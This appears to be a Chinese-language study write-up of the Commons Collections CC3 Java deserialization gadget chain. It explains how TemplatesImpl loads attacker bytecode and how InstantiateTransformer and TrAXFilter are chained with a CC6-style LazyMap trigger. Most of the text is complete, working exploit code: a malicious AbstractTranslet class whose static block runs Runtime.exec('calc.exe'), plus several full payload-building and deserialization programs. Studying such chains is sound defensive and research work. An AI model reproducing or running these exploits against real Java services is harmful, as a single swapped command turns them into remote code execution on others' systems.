CC3中的利用方式的关键点
其实就是我们CC6中无数组构造形式
即利用`TemplatesImpl`加载恶意字节码

还是再来一遍，我们深入分析一下`TemplatesImpl`是怎么加载恶意字节码的

# `TemplatesImpl`加载恶意字节码
我们在讲类的动态加载的过程中，我们知道defineClass就是从字节中加载一个类，我们查找调用，会发现这个`TemplatesImpl`类中有一个defaul修饰的defineClass方法
![[Pasted image 20251210151005.png]]
由于是default，我们在本包中查找用法
找到了private修饰的defineTransletClasses()方法
![[Pasted image 20251210151314.png]]
值得注意的是这里defineClass后是一个_class类型，并且`_bytecodes`必须不能为空，否则抛异常。
并且`_tfactory`要调用方法，也必须赋值
![[Pasted image 20251210152148.png]]![[Pasted image 20251210153813.png]]
所以因为我们知道，一个对象要实例化才能调用其中的方法
在查找用法的时候有三个实现的地方
![[Pasted image 20251210152352.png]]
其中只有下面这个返回值是一个实例，其他的返回值都是一个对象，利用方法还需要进一步的操作。所以我们使用第三个这个
![[Pasted image 20251210152517.png]]
所以我们完整看看这个方法，`_name`不能为空`_Class`必须为空
![[Pasted image 20251210152758.png]]
继续查找用法，ok  找到了这个public方法
![[Pasted image 20251210153023.png]]


ok所以我们从`TemplatesImpl.newTransformer()`就可以走到`defineClass()`去加载字节码。
```java
TemplatesImpl templates = new TemplatesImpl();  
templates.newTransformer();
```
调用链条很简单

我们只用通过反射去改属性即可
总结一下上面分析的时候说的条件
0.5 `_class`为null，或者不写
1.`_name`不为空
2.`_bytecodes`：恶意类的字节码
3.`_tfactory`
前两个比较好达成，我们来看看第三个
![[Pasted image 20251210162912.png]]
他是一个`transient`修饰的属性，说明他不可被序列化
这种private，transient修饰的通常在readObject中进行赋值
`_tfactory = new TransformerFactoryImpl();`![[Pasted image 20251210163333.png]]
并且在这里
![[Pasted image 20251210164532.png]]
4.我们发现我们执行的字节码的类的父类必须是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`
![[Pasted image 20251210164605.png]]
# 构造`TemplatesImpl` exp
Test.java
我们必须要继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`
必须要重写方法
```java
package org.example.CC.CC3;  
  
import java.io.IOException;  
  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
public class Test extends AbstractTranslet{  
    static {  
        try {  
            Runtime.getRuntime().exec("calc.exe");  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
```



CC3 exp
```java
package org.example.CC.CC3;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
public class CC3 {  
    public static void main(String[] args)throws Exception {  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
        //入口方法newTransformer()  
        templates.newTransformer();  
  
    }  
}
```

OK，现在我们只要能走到`newTransformer()`方法就可以加载我们的字节码了。

---
至此，我们无论是后面接着CC6进行无数组的构造
```java
package org.example.CC.CC3;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC3 {  
    public static void main(String[] args)throws Exception {  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
 //----------------------------------------------------------------------    
 //cc6
        
  
  
  
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});  
        Transformer transformer = new InvokerTransformer("newTransformer", null, null);  //入口方法newTransformer() 
  
  
        Map evilMap = new HashMap();  
        Map lazyMap = LazyMap.decorate(evilMap, fakeChain);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);  
  
        // tweak，fakeChain换成真正的InvokerTransformer  
        Field f = LazyMap.class.getDeclaredField("factory");  
        f.setAccessible(true);  
        f.set(lazyMap, transformer);  
  
        //恢复链子  
        Map expMap = new HashMap();  
        expMap.put(tiedMapEntry, "aura");  
        evilMap.clear();//清空evilMap，确保键不存在，可以进那个if语句  
  
        //serialize(expMap);  
        unserialize("ser.bin");  
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```

# 进一步应用

虽然我们找到了入口点`newTransformer()`方法，但是实则我们可以接着找调用，找到谁调用`newTransformer()`

我们进一步找到了`TrAXFilter`这个类
![[Pasted image 20251211222312.png]]
但值得注意的是这个类和他的父类都没有继承序列化接口，那我们就没办法了嘛？
## `InstantiateTransformer`
引入新神`InstantiateTransformer`
这个神奇的类中的`transform()`有一个很神的功能
接受传入一个`class`对象，并且调用这个class对象的构造器，去实例化一个新的对象
我们把他当我们序列化字节流中的对象，把不能序列化的类传入，进行反射调用！


![[Pasted image 20251211222634.png]]
所以我们可以写出这样的链子
```java
//反射  
TemplatesImpl templates = new TemplatesImpl();  
Class<? extends TemplatesImpl> getclass = templates.getClass();  
//_name赋值  
Field name = getclass.getDeclaredField("_name");  
name.setAccessible(true);  
name.set(templates,"anything");  
//_bytecodes赋值  
Field bytecodes = getclass.getDeclaredField("_bytecodes");  
bytecodes.setAccessible(true);  
byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
byte[][] bytes1 ={bytes};  
bytecodes.set(templates,bytes1);  
//_tfactory赋值  
Field tfactory = getclass.getDeclaredField("_tfactory");  
tfactory.setAccessible(true);  
tfactory.set(templates,new TransformerFactoryImpl());  
  
  
InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
instantiateTransformer.transform(TrAXFilter.class);
```
先创建一个构造好的`TemplatesImpl`类
通过`InstantiateTransformer`反射构造出`TrAXFilter`的对象，进而走`TrAXFilter`
构造函数中的`newTransformer`来执行我们的恶意字节码。
![[Pasted image 20251211224144.png]]
ok，现在只需要让我们的链子调用到
`instantiateTransformer`的`transform(TrAXFilter.class);`即可执行恶意字节码

### eg
我们后面衔接上我们写的CC6
```java
package org.example.CC.CC3;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.*;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
import org.apache.commons.collections.map.TransformedMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC3 {  
    public static void main(String[] args)throws Exception {  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
        //instantiateTransformer.transform(TrAXFilter.class);  
  
  
  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        Map lazymap = LazyMap.decorate(new HashMap<>(),new ConstantFactory("fakechainedTransformer"));  
        TiedMapEntry tiedmapentry = new TiedMapEntry(lazymap, "aaa");  
        //tiedmapentry.hashCode();  
        HashMap<Object, Object> aaa = new HashMap<>();  
        aaa.put(tiedmapentry,"anything");  
        lazymap.remove("aaa");  
  
        Class<LazyMap> lazyMapClass = LazyMap.class;  
        Field factory = lazyMapClass.getDeclaredField("factory");  
        factory.setAccessible(true);  
        factory.set(lazymap,chainedTransformer);  
  
        //serialize(aaa);  
        unserialize("ser.bin");  
  
  
  
          
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```








